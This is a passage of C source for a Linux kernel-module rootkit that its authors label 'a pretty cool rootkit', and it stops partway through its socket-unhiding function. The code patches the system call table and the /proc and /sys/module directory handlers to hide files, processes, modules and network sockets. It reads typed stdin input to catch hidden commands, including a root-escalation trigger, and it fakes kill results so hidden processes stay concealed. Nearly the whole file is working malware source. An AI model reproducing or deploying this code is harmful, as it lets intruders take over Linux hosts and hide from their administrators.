#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/unistd.h>
#include <linux/dirent.h>
#include <linux/vmalloc.h>
#include <linux/fs.h>
#include <linux/list.h>
#include <linux/proc_fs.h>
#include <linux/sched.h>
#include <net/tcp.h>
#include <net/udp.h>
#include <linux/inet_diag.h>
#include "sysmap.h"

#define DRIVER_AUTHOR "Christian Feist, Robert Weindl"
#define DRIVER_LICENSE "GPL"
#define DRIVER_DESC "A pretty cool rootkit"

unsigned long p_sys_call_table;

/* 
* Prototypes for functions used for hooking the read system call.
*/
asmlinkage long (*p_original_sys_read)(unsigned int, char __user *, size_t);
asmlinkage long hooked_sys_read(unsigned int fd, char __user *buf, size_t count);
void hook_sys_read(void);
void unhook_sys_read(void);

/*
* Prototypes for functions used for handling the commands availible to
* the user of the rootkit.
*/
int get_command_code(char *string);
char *strnstr(const char *haystack, const char *needle, size_t n);

/* 
* Prototypes for functions used to handle file hiding.
* Variables for keeping track of what is hidden.
*/
#define MAX_FILE_HIDE 256
int hide_file(char *command);
int unhide_file(char *command);
static int num_hidden_files = 0;
char *hidden_files[MAX_FILE_HIDE]; 	// Names of the hidden files.
asmlinkage long (*p_original_getdents64)(unsigned int, struct linux_dirent64 __user *, unsigned int);
asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);
void hook_getdents64(void);
void unhook_getdents64(void);
int is_file_hidden(char *name);

/*
* Prototypes for functions used to handle module hiding.
* Variables for keeping track of what is hidden.
* 'insert_here' is used to insert modules back into the list when they are
* being unhidden. It needs to be set every time a new module is hidden,
* otherwise we might be inserting modules into a list that is detatched from
* the actual list.
*/
#define MAX_MOD_HIDE 256
int hide_mod(char *command);
int unhide_mod(char *command);
static int num_hidden_mods = 0;
static struct list_head *insert_here = NULL; // A valid, non-hidden module in the mod list.
struct module *hidden_mods[MAX_MOD_HIDE]; // The hidden modules.
static struct file *filp_sysmodule;
struct file_operations *p_sysmodule_fop;
int (*p_original_sysmodule_readdir)(struct file *, void *, filldir_t);
int hooked_sysmodule_readdir(struct file *filp, void *dirent, filldir_t filldir);
filldir_t p_original_mod_filldir;
int hooked_mod_filldir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type);
void hook_sysmodule_readdir(void);
void unhook_sysmodule_readdir(void);
int is_mod_hidden(char *name);

/* 
* Prototypes for functions used to handle process hiding.
* Variables for keeping track of what is hidden.
*/
#define MAX_PROC_HIDE 512
int num_hidden_procs = 0;

struct hidden_proc
{
	struct task_struct *hidden_parent; // The hidden proc.
	struct task_struct **descs;	// List of descendants to be hidden
	int num_descs;			// The number of descendants
};

struct hidden_proc hidden_procs[MAX_PROC_HIDE];

int hide_proc(char *command);
int unhide_proc(char *command);
static struct proc_dir_entry *proc_root;
struct file_operations *proc_root_fops;
int (*p_original_proc_readdir)(struct file *, void *, filldir_t);
int hooked_proc_readdir(struct file *filp, void *dirent, filldir_t filldir); 
int (*p_original_proc_filldir)(void *, const char *, int, loff_t, u64, unsigned int);
int hooked_proc_filldir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type);
void hook_proc_readdir(void);
void unhook_proc_readdir(void);
int my_atoi(const char *str);
int is_descendant(const struct task_struct const *proc1, const struct task_struct const *proc2);
int is_proc_hidden(char *name);

/* 
* Prototypes for functions used to hook the kill system call handler.
* Sort of belongs to process hiding, but this is seperated to make things
* a bit more organized.
*/
asmlinkage long (*p_original_sys_kill)(int, int);
asmlinkage long hooked_sys_kill(int pid, int sig);
void hook_sys_kill(void);
void unhook_sys_kill(void);


/* 
* Prototypes for functions used to handle socket hiding.
* Variables for keeping track of what is hidden.
*/

/*
* The items storen in the hidden_sockets array. Each hidden socket is
* represented by this struct, comprised of the port the socket is listening
* on, and the protocol used by the socket. TCP is 1, UDP is 2, 0 is init value.
*/
#define MAX_SOCK_HIDE 256
#define TCP_ENTRY_SZ 150
#define UDP_ENTRY_SZ 127

struct hidden_socket
{
	int port;	// -1 means nothing is stored.
	int protocol;	//TCP = 1, UDP = 2
};

int num_hidden_sockets = 0;
struct hidden_socket hidden_sockets[MAX_SOCK_HIDE];
struct tcp_seq_afinfo *tcp_afinfo = NULL;
struct udp_seq_afinfo *udp_afinfo = NULL;
int (*p_original_tcp_seq_show)(struct seq_file *, void *);
int (*p_original_udp_seq_show)(struct seq_file *, void *);
int hooked_tcp_seq_show(struct seq_file *m, void *v);
int hooked_udp_seq_show(struct seq_file *m, void *v);
void hook_tcp_udp_seq_ops(void);
void unhook_tcp_udp_seq_ops(void);
int hide_socket(char *command);
int unhide_socket(char *command);
asmlinkage long (*p_original_socketcall)(int, unsigned long __user *);
asmlinkage long hooked_socketcall(int call, unsigned long __user *args);
void hook_socketcall(void);
void unhook_socketcall(void);

/*
* Prototypes for functions to escalate privileges to root.
*/
void get_root(void);


int init_module(void)
{
	int i;
	
	// Get the system call table.
	p_sys_call_table = (unsigned long)prak_sys_call_table;

	// Set hidden_files to all NULL.
	for (i = 0; i < MAX_FILE_HIDE; i++)
		hidden_files[i] = NULL;

	// Set hidden_modules names to all NULL.
	for (i = 0; i < MAX_MOD_HIDE; i++)
		hidden_mods[i] = NULL;

	// Init the list of hidden procs. The desc lists are empty.
	for (i = 0; i < MAX_PROC_HIDE; i++)
	{
		hidden_procs[i].hidden_parent = NULL;
		hidden_procs[i].descs = NULL;
		hidden_procs[i].num_descs = 0;
	}

	// Init the list of hidden sockets. -1 in the port number indicates and empty field.
	for (i = 0; i < MAX_SOCK_HIDE; i++)
	{
		hidden_sockets[i].port = -1;
		hidden_sockets[i].protocol = 0;
	}

	hook_sys_read();
	hook_getdents64();
	hook_sysmodule_readdir();
	hook_proc_readdir();
	hook_sys_kill();
	hook_tcp_udp_seq_ops();
	hook_socketcall();

	return 0;
}

void cleanup_module(void)
{
	int i, j;

	unhook_sys_read();
	unhook_getdents64();
	unhook_sysmodule_readdir();
	unhook_proc_readdir();
	unhook_sys_kill();
	unhook_tcp_udp_seq_ops();
	unhook_socketcall();

	// Unhide all modules by reinserting them into the list.
	for (i = 0; i < MAX_MOD_HIDE; i++)
	{
		if (NULL != hidden_mods[i])
			list_add(&(hidden_mods[i]->list), insert_here);
	}

	// Unhide all processes by reinserting them into the appropriate lists.
	for (i = 0; i < MAX_PROC_HIDE; i++)
	{

		if (NULL != hidden_procs[i].hidden_parent)
		{
			// Insert descendants into tasks.
			for (j = 0; j < hidden_procs[i].num_descs; j++)
				list_add(&(hidden_procs[i].descs[j]->tasks), &(init_task.tasks));

			// Insert process back into tasks and siblings.
			list_add(&(hidden_procs[i].hidden_parent->tasks), &(init_task.tasks));
			list_add(&(hidden_procs[i].hidden_parent->sibling), &(hidden_procs[i].hidden_parent->real_parent->children));

			// Free data.
			if (hidden_procs[i].num_descs > 0)
				vfree(hidden_procs[i].descs);

			hidden_procs[i].hidden_parent = NULL;
			hidden_procs[i].descs = NULL;
			hidden_procs[i].num_descs = 0;
		}
	}	
}

/*
*************************************************
*		Functions used for		*
* 		hooking the read system call	*
*************************************************
*/

void hook_sys_read(void)
{
	// Replace the read system call with our own.
	p_original_sys_read = (asmlinkage long (*)(unsigned int, char __user *, size_t))prak_sys_read;
	write_cr0(read_cr0() & (~0x10000));
	((unsigned long *)p_sys_call_table)[__NR_read] = (unsigned long)hooked_sys_read;
	write_cr0(read_cr0() | 0x10000);
}

void unhook_sys_read(void)
{
		
	write_cr0(read_cr0() & (~0x10000));
	((unsigned long *)p_sys_call_table)[__NR_read] = (unsigned long)p_original_sys_read;
	write_cr0(read_cr0() | 0x10000);
}

asmlinkage long hooked_sys_read(unsigned int fd, char __user *buf, size_t count){
	long ret_val = p_original_sys_read(fd, buf, count);
	static char str_buf[1024];
	static int buf_len = 0;
	
	if (0 == fd)
	{
		switch (buf[0])
		{
			case 13:	// ENTER
				// Check for command and handle it.
				switch(get_command_code(str_buf))
				{
					case 0:
						hide_file(str_buf);
						break;

					case 1:
						unhide_file(str_buf);
						break;

					case 2:	
						hide_proc(str_buf);
						break;

					case 3:	
						unhide_proc(str_buf);	
						break;

					case 4:
						hide_mod(str_buf);
						break;

					case 5:
						unhide_mod(str_buf);
						break;

					case 6:	
						hide_socket(str_buf);
						break;

					case 7:	
						unhide_socket(str_buf);
						break;

					case 8:
						get_root();
						break;
	
					default:
						printk("Nothing\n");
				}

				// Flush buffer in all cases.
				buf_len = 0;
				str_buf[buf_len] = '\0';					
				break;

			case 127: 	// BACKSPACE
				if (buf_len > 0)
					str_buf[--buf_len] = '\0';
				break;

			default:	// Normal character.
				if (buf_len > 1000)
				{
					buf_len = 0;
					str_buf[buf_len] = '\0';
				}
				else
				{
					str_buf[buf_len++] = buf[0];
					str_buf[buf_len] = '\0';
				}
		}
	}

	return ret_val;
}


/*
*************************************************
*	Functions for handling user input	*
*************************************************
*/

/*
* Returns a positive command code if a code is recognized.
* If no code is recognized, -1 is return. Very scalable.
*/
int get_command_code(char *string)
{
	// file_hide prefix
	if (NULL != strnstr(string, "file_hide ", strlen(string)))	
		return 0;

	// file_unhide prefix	
	if (NULL != strnstr(string, "file_unhide ", strlen(string)))
		return 1;

	// proc_hide pid
	if (NULL != strnstr(string, "proc_hide ", strlen(string)))
		return 2;

	// proc_unhide pid
	if (NULL != strnstr(string, "proc_unhide ", strlen(string)))
		return 3;

	// mod_hide modname
	if (NULL != strnstr(string, "mod_hide ", strlen(string)))
		return 4;

	// mod_unhide modname
	if (NULL != strnstr(string, "mod_unhide ", strlen(string)))
		return 5;

	// sock_hide port protocol
	if (NULL != strnstr(string, "sock_hide ", strlen(string)))
		return 6;

	// sock_unhide port protocol
	if (NULL != strnstr(string, "sock_unhide ", strlen(string)))
		return 7;

	// get_root
	if (NULL != strnstr(string, "get_root", strlen(string)))
		return 8;

	return -1;
}


char *strnstr(const char *haystack, const char *needle, size_t n)
{
	char *s = strstr(haystack, needle);

	if (NULL == s)
		return NULL;

	// Not outside of boundary?
	if (s - haystack +strlen(needle) <= n)
		return s;
	else
		return NULL;
}


/* 
*************************************************
* 	Functions used to handle file hiding.	*
*************************************************
*/

/* 
* This function looks at the command which was issued to hide a file
* with a certain prefix. It extracts this prefix, checks whether
* this prefix is alread being hidden and if not, it adds it to a list
* of file/prefix-names to be hidden 'hidden_files'.
* Return 1 on success, 0 on failure. Failure can have two reasons:
* maximum number of hidable files is reached or file already hidden.
*/
int hide_file(char *command)
{
	// Get pointer to prefix name in string. Rest of the string is prefix. 
	char *p_file_prefix = command + strlen("file_hide") + 1;
	int i;

	if (num_hidden_files == MAX_FILE_HIDE)
		return 0;

	// Check if prefix is already in use. 
	for (i = 0; i < MAX_FILE_HIDE; i++)
	{
		if (NULL != hidden_files[i])	
		{
			if (!strcmp(p_file_prefix, hidden_files[i]))
				return 0;
		}
	}	

	// Prefix is obviously not yet hidden. Hide it. Find first space in array that is not NULL and store it there.
	for (i = 0; i < MAX_FILE_HIDE; i++)
	{
		if (NULL == hidden_files[i])
		{
			hidden_files[i] = (char*)vmalloc(sizeof(char) * strlen(p_file_prefix));
			strcpy(hidden_files[i], p_file_prefix);
			break; // IMPORTANT!!!
		}
	}

	num_hidden_files++;
	return 1;
}

/*
* This function checks if the file prefix specified in the command
* is actually being hidden at the moment. If it is, it removes it from
* this list, thus unhiding the files. On success, it returns 1 and otherwise
* it returns 0.
*/
int unhide_file(char *command)
{
	// Get pointer to prefix name in string. Rest of the string is prefix. 
	char *p_file_prefix = command + strlen("file_unhide") + 1;
	int i;
	for (i = 0; i < MAX_FILE_HIDE; i++)
	{
		if (NULL != hidden_files[i])
		{
			if (!strcmp(hidden_files[i], p_file_prefix)) 
			{
				vfree(hidden_files[i]);
				hidden_files[i] = NULL;
				num_hidden_files--;
				return 1;
			}
		}
	}

	return 0;
}

void hook_getdents64(void)
{
	// Replace the getdents64 handler with our own.
	p_original_getdents64 = (asmlinkage long (*)(unsigned int, struct linux_dirent64 __user *, unsigned int))prak_sys_getdents64;
	write_cr0(read_cr0() & (~0x10000));
	((unsigned long *)p_sys_call_table)[__NR_getdents64] = (unsigned long)hooked_getdents64;
	write_cr0(read_cr0() | 0x10000);
}

void unhook_getdents64(void)
{
		
	write_cr0(read_cr0() & (~0x10000));
	((unsigned long *)p_sys_call_table)[__NR_getdents64] = (unsigned long)p_original_getdents64;
	write_cr0(read_cr0() | 0x10000);
}

asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count)
{
	long original_bytes_read = p_original_getdents64(fd, dirent, count);
	struct linux_dirent64 *p_forged_dirent = (struct linux_dirent64*)vmalloc(sizeof(char) * count);
	struct linux_dirent64 *p_temp = dirent; // Used sort of an an 'iterator'
	long bytes_left = original_bytes_read;
	long forged_bytes_read = 0;

	while (bytes_left > 0)
	{
		if (!is_file_hidden(p_temp->d_name))
		{
			memcpy((struct linux_dirent64*)((char*)p_forged_dirent + forged_bytes_read), p_temp, p_temp->d_reclen);
			forged_bytes_read += p_temp->d_reclen;
		}

		bytes_left -= p_temp->d_reclen;
		p_temp = (struct linux_dirent64*)((char*)p_temp + p_temp->d_reclen);
	}

	// Make sure non of the original data is still in memory.
	memset(dirent, 0, original_bytes_read);
	memcpy(dirent, p_forged_dirent, forged_bytes_read);
	
	vfree(p_forged_dirent);
	return forged_bytes_read;
}

/*
* Searched the list of hidden files for the name.
* Returns 1 if file is to be hidden. Otherwise 0 is returned.
*/
int is_file_hidden(char *name)
{
	int i;
	for (i = 0; i < MAX_FILE_HIDE; i++)
	{
		if (NULL != hidden_files[i])
		{
			// Only check prefix! => Use strlen(hidden_files[i])
			if (NULL != strnstr(name, hidden_files[i], strlen(hidden_files[i])))
				return 1;
		}	
	}

	return 0;
}


/*
*************************************************
*	Functions used for hooking the readir	*
* 	function of /sys/module, and hiding	*
*	modules specified by the user.		*
*************************************************
*/

/* 
* This function looks at the command which was issued to hide a module 
* with the given name. It checks whether
* this module is alread being hidden and if not, it adds it to a list
* of mod-names to be hidden 'hidden_mods'.
* Return 1 on success, 0 on failure. Failure can have three reasons:
* maximum number of hidable modules is reached, mod already hidden,
* or it doesn't exist.
*/
int hide_mod(char *command)
{
	// Get pointer to the mod name in string. 
	char *p_mod_name = command + strlen("mod_hide") + 1;
	int i;
	struct module *p_mod = ((struct module *(*)(const char *))prak_find_module)(p_mod_name);

	// Module doesn't exist. Abort.
	if (NULL == p_mod)
		return 0;

	if (num_hidden_mods == MAX_MOD_HIDE)
		return 0;

	// Check if mod is already being hidden. 
	for (i = 0; i < MAX_MOD_HIDE; i++)
	{
		if (NULL != hidden_mods[i])	
		{
			if (!strcmp(p_mod_name, hidden_mods[i]->name))
				return 0;
		}
	}	

	// Module is obviously not yet hidden. Hide it. Find first space in array that is not NULL and store it there.
	for (i = 0; i < MAX_MOD_HIDE; i++)
	{
		if (NULL == hidden_mods[i])
		{
			hidden_mods[i] = p_mod;

			// Remove from the list and set 'insert_here' correctly.
			insert_here = p_mod->list.prev;
			list_del(&(p_mod->list));
			break; // IMPORTANT!!!
		}
	}

	num_hidden_mods++;
	return 1;
}

/*
* This function checks if the module name specified in the command
* is actually being hidden at the moment. If it is, it removes it from
* this list, thus unhiding the module. On success, it returns 1 and otherwise
* it returns 0.
*/
int unhide_mod(char *command)
{
	// Get pointer to prefix name in string. 
	char *p_mod_name = command + strlen("mod_unhide") + 1;
	int i;
	for (i = 0; i < MAX_MOD_HIDE; i++)
	{
		if (NULL != hidden_mods[i])
		{
			if (!strcmp(hidden_mods[i]->name, p_mod_name)) 
			{
				// Insert back into the list.
				list_add(&(hidden_mods[i]->list), insert_here);

				hidden_mods[i] = NULL;
				num_hidden_mods--;
				return 1;
			}
		}
	}

	return 0;
}

/*
* Replaces the readdir function of /sys/module with our own.
* TODO: Replace pointer or replace entire f_op?? Other file systems might
* by using the same file_operations struct?
*/
void hook_sysmodule_readdir(void)
{
	// Get pointer to the file struct for /sys/module
	filp_sysmodule = ((struct file * (*)(const char *, int, int))prak_filp_open)("/sys/module", O_RDONLY, 0600);	
	p_sysmodule_fop = filp_sysmodule->f_op; // Issues a warning, ignore it.

	p_original_sysmodule_readdir = p_sysmodule_fop->readdir;
	write_cr0(read_cr0() & (~0x10000));
	p_sysmodule_fop->readdir = hooked_sysmodule_readdir;	
	write_cr0(read_cr0() | 0x10000);
}

void unhook_sysmodule_readdir(void)
{
	
	write_cr0(read_cr0() & (~0x10000));
	p_sysmodule_fop->readdir = p_original_sysmodule_readdir;	
	write_cr0(read_cr0() | 0x10000);
}

/*
* This is the hooked readdir function for /sys/module. We hook it to use
* out own filldir function 'hooked_mod_filldir', which filters out the modules
* the modules that should be hidden, when listing entries in /sys/module.
*/
int hooked_sysmodule_readdir(struct file *filp, void *dirent, filldir_t filldir)
{
	// Get the filldir function being used by default. Use our own instead.
	p_original_mod_filldir = filldir;
	return p_original_sysmodule_readdir(filp, dirent, hooked_mod_filldir);
}

/*
* This is the hooked filldir function that is used in the hooked readdir 
* handler for the /sys/module readdir. It filters out all modules that
* are to be hidden. These are store in the array hidden_mods.
*/
int hooked_mod_filldir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
{
	// Copy the string. Don't go over constant data.
	char *tmp_name = (char*)vmalloc(sizeof(char) * strlen(name));
	strcpy(tmp_name, name);

	if (is_mod_hidden(tmp_name))
	{
		vfree(tmp_name);
		return 0;
	}

	vfree(tmp_name);
	return p_original_mod_filldir(__buf, name, namlen, offset, ino, d_type);
}

/*
* This checks if the module with the name 'name' is being hidden or not.
* If so, it returns 1, otherwise it returns 0.
*/
int is_mod_hidden(char *name)
{
	int i;
	for (i = 0; i < MAX_MOD_HIDE; i++)
	{
		if (NULL != hidden_mods[i])
		{
			if (!strcmp(hidden_mods[i]->name, name))
				return 1;
		}
	}
		
	return 0;
}

/*
*************************************************
*	Functions used for hooking the readir	*
* 	function of /proc, and hiding		*
*	processes specified by the user.	*
*************************************************
*/

// Pain in the ass to implement.
int hide_proc(char *command)
{
	// Get the pid and check if it is valid.
	int proc_pid;
	int i, j;
	int num_of_descs = 0;
	char pid_str[16];
	char *pid_string = command + strlen("proc_hide") + 1;
	struct task_struct *hide_me = NULL;
	struct task_struct *p = NULL;
	struct task_struct *desc_buffer[MAX_PROC_HIDE / 4];

	// Check if maximum is already reached.
	if (MAX_PROC_HIDE == num_hidden_procs)
		return 0;
	
	i = 0;	
	while (pid_string[i] != '\0')
	{
		pid_str[i] = pid_string[i];
		i++;
		
		if (i == 16) // 15 chars is max length here...should suffice.
			return 0; // Bad pid, abort.
	}
	pid_str[i] = '\0';

	proc_pid = my_atoi(pid_str);
	if (proc_pid < 0)
		return 0; // Bad pid, abort.

	// Check if the process exists.
	hide_me = pid_task(((struct pid * (*)(int))prak_find_vpid)(proc_pid), PIDTYPE_PID);

	if (NULL != hide_me)
	{
		/* 
		* Process already being hidden? Can be a hidden proc 
		* or a descendant of one that is already being hidden.
		*/
		for (i = 0; i < MAX_PROC_HIDE; i++)
		{
			if (NULL != hidden_procs[i].hidden_parent)
			{
				// Already being hidden.
				if (hidden_procs[i].hidden_parent == hide_me)
					return 0;
				/* 
				* Check if proc_pid is already hidden	
				* as a descendant.
				*/
				for (j = 0; j < hidden_procs[i].num_descs; j++)
				{
					if (hidden_procs[i].descs[j] == hide_me)
						return 0;
				}
			}
		}

		/*
		* The process is not being hidden yet. Not as a normal proc
		* and not as a descendant. So we have to hide it and all
		* of its descendants.
		*/	
		for (i = 0; i < MAX_PROC_HIDE; i++)
		{
			// Find an empty spot.
			if (NULL == hidden_procs[i].hidden_parent)
			{
				hidden_procs[i].hidden_parent = hide_me;	

				// Look for descendants to hide.
				for_each_process(p)	
				{
					if (is_descendant(hide_me, p))
						desc_buffer[num_of_descs++] = p;
				}

				if (num_of_descs > 0)
				{
					hidden_procs[i].num_descs = num_of_descs;
					hidden_procs[i].descs = (struct task_struct **)vmalloc(sizeof(struct task_struct *) * num_of_descs);
					for (j = 0; j < num_of_descs; j++)
						hidden_procs[i].descs[j] = desc_buffer[j];
				}

				break; // IMPORTANT!!!
			}
		}

		// Remove the process from the lists.
		list_del(&(hidden_procs[i].hidden_parent->tasks));
		list_del(&(hidden_procs[i].hidden_parent->sibling));

		// Remove the descendants from the tasks list.
		for (j = 0; j < hidden_procs[i].num_descs; j++)
			list_del(&(hidden_procs[i].descs[j]->tasks));	
	}
	
	// Everything went smoothly.	
	num_hidden_procs++;
	return 1;
}

/*
* Unhides the process specified by the user. All hidden descendant processes
* will be unhidden aswell. The process is only unhidden, if is not the 
* descendant of a hidden process. Returns 1 on success, 0 elsewise.
*/

int unhide_proc(char *command)
{
	// Get the pid and check if it is valid.
	int proc_pid;
	int i, j;
	char pid_str[16];
	char *pid_string = command + strlen("proc_unhide") + 1;

	i = 0;	
	while (pid_string[i] != '\0')
	{
		pid_str[i] = pid_string[i];
		i++;
		
		if (i == 16) // 15 chars is max length here...should suffice.
			return 0; // Bad pid, abort.
	}
	pid_str[i] = '\0';

	proc_pid = my_atoi(pid_str);
	if (proc_pid < 0)
		return 0; // Bad pid, abort.

	/* 
	* Only check hidden parent procs, not descendants. We can't unhide
	* descendants if the parent is hidden. That wouldn't make sense.
	*/
	for (i = 0; i < MAX_PROC_HIDE; i++)
	{
		if (NULL != hidden_procs[i].hidden_parent)
		{
			// Remove from array and insert back into lists.
			if (hidden_procs[i].hidden_parent->pid == proc_pid)
			{
				// Insert descendants into tasks.
				for (j = 0; j < hidden_procs[i].num_descs; j++)
					list_add(&(hidden_procs[i].descs[j]->tasks), &(init_task.tasks));

				// Insert process back into tasks and siblings.
				list_add(&(hidden_procs[i].hidden_parent->tasks), &(init_task.tasks));
				list_add(&(hidden_procs[i].hidden_parent->sibling), &(hidden_procs[i].hidden_parent->real_parent->children));

				// Free data.
				if (hidden_procs[i].num_descs > 0)
					vfree(hidden_procs[i].descs);

				hidden_procs[i].hidden_parent = NULL;
				hidden_procs[i].descs = NULL;
				hidden_procs[i].num_descs = 0;

				num_hidden_procs--;
				return 1;
			}
		}
	}	
	
	return 0;
}

/*
* Use the proc_dir entry 'proc_root' defined in the system map
* to extract the file operations for /proc. We hook the readdir
* function of /proc and use our own.
*/
void hook_proc_readdir(void)
{
	proc_root = (struct proc_dir_entry *)prak_proc_root;
	proc_root_fops = proc_root->proc_fops;
	p_original_proc_readdir = proc_root_fops->readdir;

	write_cr0(read_cr0() & (~0x10000));
	proc_root_fops->readdir = hooked_proc_readdir;
	write_cr0(read_cr0() | 0x10000);
}

void unhook_proc_readdir(void)
{
	write_cr0(read_cr0() & (~0x10000));
	proc_root_fops->readdir = p_original_proc_readdir;
	write_cr0(read_cr0() | 0x10000);
}

/*
* Get the original filldir function. Use our own instead. That way we can
* filter out the processes which we want to hide.
*/
int hooked_proc_readdir(struct file *filp, void *dirent, filldir_t filldir) 
{
	p_original_proc_filldir = filldir;
	return p_original_proc_readdir(filp, dirent, hooked_proc_filldir);
}

/*
* Filter out the processes that should be hidden
*/
int hooked_proc_filldir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
{
	// Copy the string. Don't go over constant data.
	char *tmp_name = (char*)vmalloc(sizeof(char) * strlen(name));
	strcpy(tmp_name, name);

	if (is_proc_hidden(tmp_name))
		return 0;

	return p_original_proc_filldir(__buf, name, namlen, offset, ino, d_type);
}

int my_atoi(const char *str)
{
	int numeric_val = 0;
	char temp[strlen(str)];
	char *p_iter;
	int scalar = 1;
	int decimal = 0;

	strcpy(temp, str);

	/* Start at the end of the string, rather than the front. */
	for (p_iter = temp + strlen(str) - 1; temp <= p_iter; p_iter--)
	{
		if (*p_iter < '0' || *p_iter > '9')
			return -1;

		decimal = (int)(*p_iter - '0');
		numeric_val += scalar * decimal;
		scalar *= 10;	// Next highest position in number.
	}

	return numeric_val;
}

/*
* This function checks if proc2 is a descendant of proc1. It does this
* by traversing the proc tree upwards by going over the parent nodes.
* If it encounters proc1, then it is a descendant of proc1. If it reaches
* the init_task without reaching proc1, it is not a descendant of proc1.
* Returns 1 if descendant, 0 if not.
*/
int is_descendant(const struct task_struct const *proc1, const struct task_struct const *proc2)
{
	struct task_struct *tmp = proc2; // Ignore the warning.

	while (tmp != &init_task)
	{
		if (tmp->real_parent == proc1)
			return 1;

		tmp = tmp->real_parent;
	}

	return 0;
}

/*
* 'name' is the the pid in string form. This function checks if the 
* process with the pid 'name' is supposed to be hidden from the user.
* It checks hidden_procs and the descendants of each entry for the pid.
* Return 1 if proc is to be hidden, 0 if not.
*/
int is_proc_hidden(char *name)
{
	int proc_pid = my_atoi(name);
	int i, j;
	
	if (proc_pid > 0)
	{
		for (i = 0; i < MAX_PROC_HIDE; i++)
		{
			if (NULL != hidden_procs[i].hidden_parent)			
			{
				if (hidden_procs[i].hidden_parent->pid == proc_pid)
					return 1;

				// Check descendants, if any exist.
				for (j = 0; j < hidden_procs[i].num_descs; j++)
				{
					if (hidden_procs[i].descs[j]->pid == proc_pid)
						return 1;
				}
			}
		}
	}

	return 0;
}

/*
*************************************************
*	Functions used for hooking the kill	*
* 	system call handler			*
*************************************************
*/

/* 
* If the pid is that of a hidden process or one of its descendants,
* ignore the kill message and trick the user into thinking that the process
* doesn't exist by returning -ESRCH. We do this because otherwise the user
* could figure out (i.e. by brute force) that something hidden exists.
*/
asmlinkage long hooked_sys_kill(int pid, int sig)
{
	int i, j;
	
	for (i = 0; i < MAX_PROC_HIDE; i++)
	{
		if (pid == hidden_procs[i].hidden_parent->pid)
			return -ESRCH;

		// Check the descendants.
		for (j = 0; j < hidden_procs[i].num_descs; j++)
		{
			if (pid == hidden_procs[i].descs[j]->pid)
				return -ESRCH;
		}
	}

	// Not a hidden process, continue as usual.
	return p_original_sys_kill(pid, sig);
}

void hook_sys_kill(void)
{
	p_original_sys_kill = (asmlinkage long (*)(int,int))prak_sys_kill;
	write_cr0(read_cr0() & (~0x10000));
	((unsigned long *)p_sys_call_table)[__NR_kill] = (unsigned long)hooked_sys_kill;
	write_cr0(read_cr0() | 0x10000);
}

void unhook_sys_kill(void)
{
	write_cr0(read_cr0() & (~0x10000));
	((unsigned long *)p_sys_call_table)[__NR_kill] = (unsigned long)p_original_sys_kill;
	write_cr0(read_cr0() | 0x10000);
}

/*
*************************************************
*	Functions used for socket hiding.	*
* 	We hook the seq_ops.show for		* 
*	/proc/net/tcp and /proc/net/udp,	* 
* 	awsell as the socket_call system call.	*
*************************************************
*/

/*
* This functions gets the port and protocol type for the socket that should 
* be hidden. Depending on whether it's a tcp or udp port, it hides the 
* connection accordingly. It return 1 on success, 0 on failure. It adds
* the hidden socket to the list 'hidden_sockets, along with the port and 
* protocol type. The function will fail, if the socket is already being hidden
* (port and protocol match), if the port number/protocol is bogus or the
* number of hideable sockets is maxed out. 
*/
int hide_socket(char *command)
{
	int i;
	char *p_socket_info = command + strlen("sock_hide") + 1;
	char port_num[16];
	int hide_me;

	if (num_hidden_sockets == MAX_SOCK_HIDE)
		return 0;

	// Get port number.
	i = 0;
	while (' ' != p_socket_info[i])
	{
		port_num[i] = p_socket_info[i];
		i++;

		if (i == 16) // 15 chars is max. Need one more for '\0'.
			return 0;	// Bad port num, to long. Abort.
	}

	port_num[i] = '\0';	
	hide_me = my_atoi(port_num);

	// Check if port number is okay. A port number is 16 bits.
	if (hide_me < 0 && hide_me >= 65536)
		return 0;

	// Port number is okay. Get protocol type.
	if (strnstr(p_socket_info + i + 1, "tcp", strlen("tcp")))
	{
		// Check if this socket is already hidden.
		for (i = 0; i < MAX_SOCK_HIDE; i++)
		{
			if (hidden_sockets[i].port == hide_me 
				&& hidden_sockets[i].protocol == 1) // TCP
				return 0;
		}

		// Find an empty spot.
		for (i = 0; i < MAX_SOCK_HIDE; i++)
		{
			if (hidden_sockets[i].port < 0)
			{
				hidden_sockets[i].port = hide_me;
				hidden_sockets[i].protocol = 1; // TCP
				break; // IMPORTANT!!
			}
		}
			
	}
	else if (strnstr(p_socket_info + i + 1, "udp", strlen("udp")))
	{
		// Check if this socket is already hidden.
		for (i = 0; i < MAX_SOCK_HIDE; i++)
		{
			if (hidden_sockets[i].port ==hide_me 
				&& hidden_sockets[i].protocol == 2) // UDP
				return 0;
		}

		// Find an empty spot.
		for (i = 0; i < MAX_SOCK_HIDE; i++)
		{
			if (hidden_sockets[i].port < 0)
			{
				hidden_sockets[i].port = hide_me;
				hidden_sockets[i].protocol = 2; // UDP
				break; // IMPORTANT!!
			}
		}
	}
	else
		return 0; // Bogus info. Abort.

	// Everything went smoothly.
	num_hidden_sockets++;
	return 1;
}

/*
* Unhide the socket listening on a port and using the protocol
* specified by the user. Returns 1 on success, 0 elsewise.
* Can fail if the port number is bad or the protocol type is omitted for
* example.
*/
int unhide_socket(char *command)
{
	int i;
	char *p_socket_info = command + strlen("sock_unhide") + 1;
	char port_num[16];
	int unhide_me;

	// Get port number.
	i = 0;
	while (' ' != p_socket_info[i])
	{
		port_num[i] = p_socket_info[i];
		i++;

		if (i == 16) // 15 chars is max. Need one more for '\0'.
			return 0;	// Bad port num, to long. Abort.
	}

	port_num[i] = '\0';	
	unhide_me = my_atoi(port_num);

	// Check if port number is okay. A port number is 16 bits.
	if (unhide_me < 0 && unhide_me >= 65536)
		return 0;

	// Port number is okay. Get protocol type.
	if (strnstr(p_socket_info + i + 1, "tcp", strlen("tcp")))
	{
		// Check if the socket is being hidden and unhide it.
		for (i = 0; i < MAX_SOCK_HIDE; i++)
		{
			if (hidden_sockets[i].port == unhide_me
				&& hidden_sockets[i].protocol == 1) // TCP
			{
				hidden_sockets[i].port = -1;
				hidden_sockets[i].protocol = 0;	
				break; // IMPORTANT!!	
			}
		}
	}
	else if (strnstr(p_socket_info + i + 1, "udp", strlen("udp")))
	{
